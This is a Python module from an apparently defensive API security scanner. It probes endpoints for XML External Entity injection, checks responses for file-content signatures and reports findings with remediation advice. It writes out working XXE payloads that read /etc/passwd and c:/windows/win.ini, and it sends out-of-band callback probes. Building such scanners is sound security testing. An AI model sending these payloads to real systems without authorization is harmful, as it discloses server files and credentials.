from __future__ import annotations

import logging
from typing import Any, Dict, List, Optional

from app.scanners.api_scanner.engine.oob_server import OOBTracker
from app.scanners.api_scanner.engine.oob_tokens import xxe_oob_payloads
from app.scanners.api_scanner.engine.request_executor import execute_request
from app.scanners.api_scanner.tests import build_url, make_finding

logger = logging.getLogger(__name__)

OWASP = "Injection"
REF = "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection"

XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"""

XXE_PAYLOAD_WINDOWS = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>"""

# Signatures that indicate file content was returned
FILE_SIGNATURES = [
    "root:x:0:0",        # /etc/passwd
    "daemon:x:",          # /etc/passwd
    "[extensions]",       # win.ini
    "for 16-bit app",     # win.ini
]


async def run_xxe_tests(
    endpoint: Dict[str, Any],
    base_url: str,
    auth_headers: Dict[str, str],
    query_params: Dict[str, str],
    oob_tracker: Optional[OOBTracker] = None,
) -> List[Dict[str, Any]]:
    """Test for XML External Entity injection on endpoints that may accept XML."""
    findings: List[Dict[str, Any]] = []
    method = endpoint.get("method", "GET")
    path = endpoint.get("path", "")
    ep_label = f"{method} {path}"

    if method not in ("POST", "PUT", "PATCH"):
        return findings

    url = build_url(base_url, path, query_params)

    for payload in (XXE_PAYLOAD, XXE_PAYLOAD_WINDOWS):
        # Send XML with XXE payload
        xml_headers = {**auth_headers, "Content-Type": "application/xml"}
        resp, evidence = await execute_request(method, url, headers=xml_headers, raw_body=payload)
        # Also try text/xml
        if resp is None or resp.status_code in (404, 405, 415):
            xml_headers["Content-Type"] = "text/xml"
            resp, evidence = await execute_request(method, url, headers=xml_headers, raw_body=payload)

        if resp is None:
            continue

        body = (resp.text or "").lower()

        # Check for file content in response
        if any(sig in body for sig in FILE_SIGNATURES):
            findings.append(make_finding(
                owasp_category=OWASP,
                title="XML External Entity (XXE) — Local File Disclosure",
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                endpoint=ep_label,
                description="The endpoint processes XML with external entity declarations and returns local file contents.",
                evidence=evidence,
                impact="Attacker can read any file on the server accessible to the application process. This includes configuration files, credentials, and source code.",
                remediation="Disable external entity processing in your XML parser. In Python: use defusedxml. In Java: set XMLConstants.FEATURE_SECURE_PROCESSING. In .NET: set XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit.",
                references=[REF],
            ))
            return findings

        # Check for XML parsing errors (indicates XML is processed but XXE blocked)
        xml_error_patterns = ["xml", "parser", "entity", "dtd", "doctype"]
        if resp.status_code in (400, 500) and any(p in body for p in xml_error_patterns):
            findings.append(make_finding(
                owasp_category=OWASP,
                title="XML Processing Detected (XXE Partially Mitigated)",
                cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
                endpoint=ep_label,
                description="The endpoint processes XML input but rejected the XXE payload. The XML parser may still be vulnerable to other XML-based attacks (billion laughs DoS, SSRF via DTD).",
                evidence=evidence,
                impact="While direct file reading is blocked, the XML parser may be vulnerable to DoS or SSRF via DTD fetching.",
                remediation="Completely disable DTD processing in the XML parser, not just external entities.",
                confidence="LOW",
                references=[REF],
            ))
            return findings

    # ── OOB XXE probes ───────────────────────────────────────────────
    if oob_tracker and oob_tracker.enabled:
        callback_url = oob_tracker.generate_payload_url(
            "xxe", ep_label, "XXE OOB external entity callback"
        )
        oob_payloads = xxe_oob_payloads(callback_url)
        for payload_xml, desc in oob_payloads:
            for content_type in ("application/xml", "text/xml"):
                xml_headers = {**auth_headers, "Content-Type": content_type}
                await execute_request(
                    method, url, headers=xml_headers, raw_body=payload_xml
                )
            logger.debug("OOB XXE probe sent: %s — %s", ep_label, desc)

    return findings
